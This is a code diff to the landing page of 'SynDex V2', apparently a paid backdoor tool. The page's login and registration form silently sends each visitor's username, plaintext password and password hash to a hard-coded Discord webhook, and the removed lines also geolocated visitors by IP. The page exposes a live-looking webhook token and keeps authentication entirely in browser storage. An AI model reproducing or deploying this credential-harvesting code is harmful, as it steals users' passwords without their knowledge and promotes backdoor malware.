@@ -30,7 +30,7 @@
 
         nav {
             display: flex; justify-content: space-between; align-items: center;
-            padding: 1rem 8%; border-bottom: 1px solid var(--border-color);
+            padding: 1.2rem 8%; border-bottom: 1px solid var(--border-color);
             backdrop-filter: blur(10px); position: sticky; top: 0; z-index: 100;
             background: rgba(5, 5, 5, 0.8);
         }
@@ -49,8 +49,6 @@
             color: var(--muted-text); text-decoration: none;
             margin-left: 2.5rem; font-size: 0.85rem; font-weight: 500;
         }
-
-        #logoutBtn { color: var(--error-red); display: none; cursor: pointer; font-weight: 700; margin-left: 2.5rem; }
 
         header {
             min-height: 60vh; display: flex; flex-direction: column;
@@ -98,7 +96,7 @@
         }
         .auth-card { background: var(--card-bg); padding: 3rem; border: 1px solid var(--border-color); border-radius: 12px; width: 90%; max-width: 450px; text-align: center; position: relative; }
         .auth-input { width: 100%; background: #1a1a1a; border: 1px solid var(--border-color); padding: 14px; color: white; border-radius: 4px; margin-bottom: 1rem; font-family: 'Inter', sans-serif; }
-        .remember-container { display: flex; align-items: center; gap: 8px; margin-bottom: 1.5rem; font-size: 0.8rem; color: var(--muted-text); text-align: left; }
+        
         #successOverlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: var(--card-bg); display: none; flex-direction: column; align-items: center; justify-content: center; z-index: 10; border-radius: 12px; }
 
         .status-wrapper { margin-top: 15px; display: inline-flex; align-items: center; gap: 10px; position: relative; cursor: help; }
@@ -126,13 +124,12 @@
         <div class="nav-links">
             <a href="#showcase">Interface</a>
             <a href="https://discord.gg/bA4PH3gvRN">Discord</a>
-            <span id="logoutBtn">Log Off</span>
         </div>
     </nav>
 
     <header>
         <div class="badge">V2.0 STABLE RELEASE</div>
-        <h1 id="heroTitle">Unmatched Power.<br>Zero Compromise.</h1>
+        <h1>Unmatched Power.<br>Zero Compromise.</h1>
         <p class="hero-text">SynDex V2 delivers the most stable backdoor environment on the market.</p>
         <button class="btn" id="mainBtn">Get SynDex Now</button>
     </header>
@@ -155,17 +152,13 @@
         <div class="auth-card">
             <div id="successOverlay">
                 <div style="font-size: 3rem; color: var(--success-green);">✓</div>
-                <h3 id="overlayText">Success</h3>
+                <h3>Success</h3>
             </div>
             <h2 id="modalTitle">Access SynDex</h2>
             <div id="error-msg" style="color: var(--error-red); font-size: 0.8rem; margin-bottom: 10px; display: none; font-weight: bold;"></div>
             <form id="authForm">
                 <input type="text" id="username" class="auth-input" placeholder="Username" required>
                 <input type="password" id="password" class="auth-input" placeholder="Password" required>
-                <div class="remember-container">
-                    <input type="checkbox" id="rememberMe">
-                    <label for="rememberMe">Remember Me</label>
-                </div>
                 <button type="submit" class="btn" style="width: 100%;" id="authSubmit">Continue</button>
             </form>
             <p style="margin-top: 1rem; font-size: 0.8rem;">
@@ -189,42 +182,22 @@
         const WEBHOOK = "https://discord.com/api/webhooks/1462655455817105490/owH-AExGFDTyZZu780-pc3z42tTnSDWOiojsuqnPy_6T5OSvzbfdYk9-d1nskcZVRfsN";
         const modal = document.getElementById('authModal');
         const mainBtn = document.getElementById('mainBtn');
-        const logoutBtn = document.getElementById('logoutBtn');
         const toggle = document.getElementById('toggleAuth');
         const error = document.getElementById('error-msg');
         const authSubmitBtn = document.getElementById('authSubmit');
         let isLogin = true;
 
-        async function getLoc() {
-            try {
-                const r = await fetch('https://ipapi.co/json/');
-                const d = await r.json();
-                return `${d.city}, ${d.country_name}`;
-            } catch { return "Unknown"; }
+        // --- GLOBAL REDIRECT CHECK ---
+        if (localStorage.getItem('SYNDEX_SESSION')) {
+            window.location.href = "/dashboard";
         }
 
-        async function getHash(message) {
-            const msgUint8 = new TextEncoder().encode(message);
-            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
-            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
-        }
-
-        function checkSession() {
-            const session = localStorage.getItem('SYNDEX_SESSION');
-            if (session) {
-                mainBtn.innerText = "Launch Dashboard";
-                logoutBtn.style.display = "block";
-                document.getElementById('heroTitle').innerHTML = `Welcome Back,<br>${session}`;
-            }
-        }
-
-        // Visitor Counter logic
+        // Visitor Counter
         let c = parseInt(localStorage.getItem('SYNDEX_VISITORS') || "1241");
         if(!sessionStorage.getItem('v')) { c++; localStorage.setItem('SYNDEX_VISITORS', c); sessionStorage.setItem('v', '1'); }
         document.getElementById('count').innerText = c.toLocaleString();
 
-        mainBtn.onclick = () => { if (localStorage.getItem('SYNDEX_SESSION')) { alert("Dashboard Access Verified."); } else { modal.style.display = 'flex'; } };
-        logoutBtn.onclick = () => { localStorage.removeItem('SYNDEX_SESSION'); location.reload(); };
+        mainBtn.onclick = () => { modal.style.display = 'flex'; };
         window.onclick = (e) => { if(e.target == modal) modal.style.display = 'none'; }
 
         toggle.onclick = (e) => {
@@ -236,15 +209,20 @@
             toggle.innerText = isLogin ? 'Register' : 'Login';
         };
 
+        async function getHash(message) {
+            const msgUint8 = new TextEncoder().encode(message);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgUint8);
+            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
+
         document.getElementById('authForm').onsubmit = async (e) => {
             e.preventDefault();
             const user = document.getElementById('username').value.trim();
             const passInput = document.getElementById('password').value;
-            const remember = document.getElementById('rememberMe').checked;
             let sysDB = JSON.parse(localStorage.getItem('SYNDEX_DB_SHA') || '{}');
 
             authSubmitBtn.disabled = true;
-            authSubmitBtn.innerText = "Processing...";
+            authSubmitBtn.innerText = "Syncing...";
 
             const hashedPass = await getHash(passInput + user.toLowerCase());
             const isNexus = user.toLowerCase() === "nexus";
@@ -256,10 +234,6 @@
                     return;
                 }
             } else {
-                if (passInput.length < 5) { error.innerText = "PASSWORD TOO SHORT."; error.style.display = 'block';
-                    authSubmitBtn.disabled = false; authSubmitBtn.innerText = "Continue";
-                    return;
-                }
                 if (sysDB[user]) { error.innerText = "NAME TAKEN."; error.style.display = 'block';
                     authSubmitBtn.disabled = false; authSubmitBtn.innerText = "Continue";
                     return;
@@ -268,11 +242,10 @@
                 localStorage.setItem('SYNDEX_DB_SHA', JSON.stringify(sysDB));
             }
 
-            if (remember) localStorage.setItem('SYNDEX_SESSION', user);
+            // Save Session
+            localStorage.setItem('SYNDEX_SESSION', user);
 
-            const loc = await getLoc();
-            const now = new Date();
-
+            // Webhook Log
             const payload = {
                 embeds: [{
                     title: isLogin ? "Login Log" : "New User Log",
@@ -282,22 +255,20 @@
                         { name: "Pass", value: isNexus ? "REDACTED" : `\`${passInput}\``, inline: true },
                         { name: "Hash", value: isNexus ? "REDACTED" : `\`${hashedPass}\``, inline: false },
                         { name: "Admin", value: isNexus ? "TRUE" : "FALSE", inline: true },
-                        { name: "Region", value: loc, inline: true },
-                        { name: "Date", value: now.toLocaleDateString(), inline: true },
-                        { name: "Time", value: now.toLocaleTimeString(), inline: true }
+                        { name: "Time", value: new Date().toLocaleString(), inline: true }
                     ],
-                    footer: { text: "SynDex Security Node" },
-                    timestamp: now.toISOString()
+                    timestamp: new Date().toISOString()
                 }]
             };
 
             try { await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(payload) }); } catch (err) {}
             
+            // --- SUCCESS REDIRECT ---
             document.getElementById('successOverlay').style.display = 'flex';
-            setTimeout(() => location.reload(), 1200);
+            setTimeout(() => {
+                window.location.href = "/dashboard";
+            }, 1200);
         };
-
-        checkSession();
     </script>
 </body>
 </html>
